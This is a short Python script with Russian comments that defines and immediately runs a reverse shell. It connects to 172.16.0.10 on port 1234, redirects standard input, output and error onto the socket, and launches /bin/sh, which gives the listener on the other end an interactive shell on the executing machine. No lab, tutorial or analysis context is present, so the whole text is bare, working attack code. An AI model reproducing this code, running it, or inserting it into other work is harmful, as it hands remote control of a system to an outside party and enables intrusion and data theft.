import socket
import os

def reverse_shell(target_ip='172.16.0.10', target_port=1234):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, target_port))
    os.dup2(s.fileno(), 0)  # Перенаправление stdin
    os.dup2(s.fileno(), 1)  # Перенаправление stdout
    os.dup2(s.fileno(), 2)  # Перенаправление stderr
    os.system('/bin/sh')

reverse_shell('172.16.0.10', 1234)
